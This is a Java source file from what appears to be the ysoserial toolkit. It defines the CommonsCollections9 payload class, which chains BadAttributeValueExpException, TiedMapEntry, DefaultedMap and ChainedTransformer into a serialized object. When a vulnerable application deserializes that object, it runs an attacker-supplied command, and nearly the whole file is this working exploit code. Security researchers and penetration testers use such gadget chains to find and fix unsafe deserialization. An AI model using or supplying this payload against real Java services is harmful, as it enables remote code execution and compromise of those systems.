package ysoserial.payloads;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.DefaultedMap;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.JavaVersion;
import ysoserial.payloads.util.Reflections;
import ysoserial.payloads.util.cc.TransformerUtil;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

@Dependencies({"commons-collections:commons-collections:3.2.1"})
@Authors({Authors.Su8})
public class CommonsCollections9 implements ObjectPayload<BadAttributeValueExpException> {

	public BadAttributeValueExpException getObject(String command) throws Exception {
		String[]                      execArgs           = {command};
		Class                         c                  = (execArgs.length > 1) ? String[].class : String.class;
		ChainedTransformer            chainedTransformer = new ChainedTransformer(new Transformer[]{(Transformer) new ConstantTransformer(Integer.valueOf(1))});
		Transformer[]                 transformers       = TransformerUtil.makeTransformer(command);
		Map<Object, Object>           innerMap           = new HashMap<Object, Object>();
		Map                           defaultedmap       = DefaultedMap.decorate(innerMap, (Transformer) chainedTransformer);
		TiedMapEntry                  entry              = new TiedMapEntry(defaultedmap, "su18");
		BadAttributeValueExpException val                = new BadAttributeValueExpException(null);
		Field                         valfield           = val.getClass().getDeclaredField("val");
		valfield.setAccessible(true);
		valfield.set(val, entry);
		Reflections.setFieldValue(chainedTransformer, "iTransformers", transformers);
		return val;
	}

	public static boolean isApplicableJavaVersion() {
		return JavaVersion.isBadAttrValExcReadObj();
	}
}
